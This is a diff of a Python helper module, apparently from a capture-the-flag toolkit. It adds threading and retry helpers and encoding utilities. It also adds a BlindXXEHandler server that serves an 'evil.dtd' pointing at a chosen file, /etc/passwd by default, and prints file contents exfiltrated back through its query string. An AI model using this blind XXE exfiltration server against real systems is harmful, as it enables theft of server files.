@@ -1,21 +1,23 @@
-import re
-from os import path
-from base64 import (b32encode, b64decode, b64encode, urlsafe_b64decode,
-                    urlsafe_b64encode)
+
+from base64 import (b16decode, b16encode, b32decode, b32encode, b64decode,
+                    b64encode, urlsafe_b64decode, urlsafe_b64encode)
 from binascii import hexlify, unhexlify
+from bz2 import decompress as bz2decompress
+from concurrent.futures import ThreadPoolExecutor
+from functools import wraps
 from hashlib import md5 as _md5
 from hashlib import sha1 as _sha1
 from hashlib import sha256 as _sha256
 from hashlib import sha512 as _sha512
-from json import dumps, loads
-from random import choice, randint
-from string import ascii_lowercase, digits
-from struct import pack, unpack
-from typing import Dict, Union
-from urllib.parse import urlparse, quote_plus, unquote_plus
-from functools import wraps
 from http.server import BaseHTTPRequestHandler
-from concurrent.futures import ThreadPoolExecutor
+from json import dumps, loads
+from os import path
+from random import choice, randint
+from re import sub
+from string import ascii_lowercase, digits
+from traceback import format_exc, print_exc
+from typing import Dict, Union
+from urllib.parse import quote_plus, unquote_plus, urlparse
 
 import jwt
 
@@ -29,19 +31,19 @@ class Context:
 
 class _Multier():
 
-    def __init__(self, future, timeout, retry, pool):
+    def __init__(self, future, timeout,):
         self._future = future
         self._timeout = timeout
-        self._retry = retry
-        self._pool = pool
+        self._traceback = None
 
     def __getattr__(self, name):
         if (name == 'result'):
             return self.join()
-        elif (name == 'pool'):
-            return self._pool
         elif (name == 'exception'):
-            return self._future.exception()
+            return self.join(True)
+        elif (name == 'traceback'):
+            self.join(True)
+            return self._traceback
         elif (name == 'running'):
             return self._future.running()
         elif (name == 'done'):
@@ -49,20 +51,56 @@ class _Multier():
         else:
             return self._future.__getattribute__(name)
 
-    def join(self):
+    def join(self, exceptionFlag: bool = False):
         try:
-            return self._future.result(self._timeout)
-        except Exception:
-            if (self._retry > 0):
-                self._retry -= 1
-                return self.join()
-            else:
-                self._future.result = lambda: None
+            result = self._future.result()
+            return result
+        except Exception as e:
+            if exceptionFlag:
+                self._traceback = format_exc()
+                return e
+            return None
+
+
+def retryWrapper(retry_time: int = 2):
+    def decorator(func):
+        def inner(*args, **kwargs):
+            max_retry = retry_time
+            while max_retry >= 0:
+                try:
+                    ret = func(*args, **kwargs)
+                    return ret
+                except Exception as e:
+                    max_retry -= 1
+                    if max_retry < 0:
+                        raise e
+        return inner
+    return decorator
 
 
 def Threader(number: int, timeout: int = None, retry: int = 2):
-    """
-    A simple decorator function that can decorate the function to make it multi-threaded.
+    """A simple decorator function that can decorate the function to make it multi-threaded.
+
+    Args:
+        number (int): thread number
+        timeout (int, optional): function run timeout. Defaults to None.
+        retry (int, optional): number of retries. Defaults to 2.
+
+    Example:
+        from ctfbox import Threader, random_string, random_int
+    from time import sleep
+
+    @Threader(10)
+    def exp(i: int):
+        sleep(random_int(1, 5))
+        return "%d : %s" % (i, random_string())
+
+        tasks = [exp(i) for i in range(100)] # 100 tasks
+        for task in tasks:
+            # task.result return when a task completed
+            # task is a concurrent.futures.Future with some attributes
+            # result, running ,done, exception, traceback
+            print('result: %s running: %s done: %s exception: %s' % (task.result, task.running, task.done, task.exception))
     """
     def decorator(func):
         if isinstance(number, int):
@@ -75,11 +113,10 @@ def Threader(number: int, timeout: int = None, retry: int = 2):
 
         @wraps(func)
         def wrapped(*args, **kwargs):
+            retry_func = retryWrapper(retry)(func)
             return _Multier(
-                pool.submit(func, *args, **kwargs),
+                pool.submit(retry_func, *args, **kwargs),
                 timeout,
-                retry,
-                pool,
             )
         return wrapped
     return decorator
@@ -143,8 +180,73 @@ class ProvideHandler(BaseHTTPRequestHandler):
                 self.send_response(404)
                 self.wfile.write(b"404 Not Found\n")
             return
-        except Exception as e:
-            print("[-] " + str(e))
+        except Exception:
+            print_exc()
+
+
+class BlindXXEHandler(BaseHTTPRequestHandler):
+
+    def __init__(self, content, bz2content, customcontent, *args, **kwargs):
+        self.content = content
+        self.bz2content = bz2content
+        self.customcontent = customcontent
+        super().__init__(*args, **kwargs)
+
+    def log_message(self, format, *args):
+        pass
+
+    def do_GET(self):
+        sendReply = False
+        querypath = urlparse(self.path)
+        query_dict = {}
+        for kv in querypath.query.split("&"):
+            v = kv.split("=")
+            if len(v) > 1:
+                query_dict[v[0]] = unquote_plus(v[1])
+            else:
+                query_dict[v[0]] = None
+        filepath = querypath.path
+        try:
+            if filepath == "/evil.dtd":
+                sendReply = True
+                self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
+                self.end_headers()
+                if "bz2" in query_dict:
+                    content = self.bz2content
+                else:
+                    content = self.content
+                readFile = query_dict.get("file", "/etc/passwd")
+                content = content.replace(b"!readFile!", readFile.encode())
+                print("test\n", content)
+                self.wfile.write(content)
+            elif filepath == "/custom.dtd":
+                sendReply = True
+                self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
+                self.end_headers()
+                content = self.customcontent
+                link = query_dict.get("link", "")
+                content = content.replace(b"!link!", link.encode())
+                self.wfile.write(content)
+            else:
+                data = querypath.query
+                try:
+                    data = b64decode(data)
+                    data = bz2decompress(data)
+                except Exception:
+                    pass
+                print("Receive file content:\n" + data.decode())
+                sendReply = True
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'<?xml version="1.0"?>\n<root></root>\n')
+            if not sendReply:
+                self.send_response(404)
+                self.wfile.write(b"404 Not Found\n")
+            return
+        except Exception:
+            print_exc()
 
 
 def url_encode(s: str, encoding: str = 'utf-8') -> str:
@@ -173,6 +275,55 @@ def base64_encode(s: str, encoding='utf-8') -> str:
         return b64encode(s.encode()).decode(encoding=encoding)
     except Exception:
         return ""
+
+
+def base32_decode(s: str, encoding='utf-8') -> str:
+    try:
+        return b32decode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base32_encode(s: str, encoding='utf-8') -> str:
+    try:
+        return b32encode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base16_decode(s: str, encoding='utf-8') -> str:
+    try:
+        return b16decode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base16_encode(s: str, encoding='utf-8') -> str:
+    try:
+        return b16encode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def html_decode(s: str) -> str:
+    def replace(matched):
+        value = int(matched.group(1))
+        return chr(value)
+
+    def replace_hex(matched):
+        value = int(matched.group(1), 16)
+        return chr(value)
+    s = sub(r'&#x(\w+);', replace_hex, s)
+    s = sub(r'&#(\w+);', replace, s)
+    return s
+
+
+def html_encode(s: str, asHex: bool = False) -> str:
+    if asHex:
+        ss = "".join(f"&#x{hex(ord(c))[2:]};" for c in s)
+    else:
+        ss = "".join(f"&#{ord(c)};" for c in s)
+    return ss
 
 
 def bin2hex(s: str) -> str:
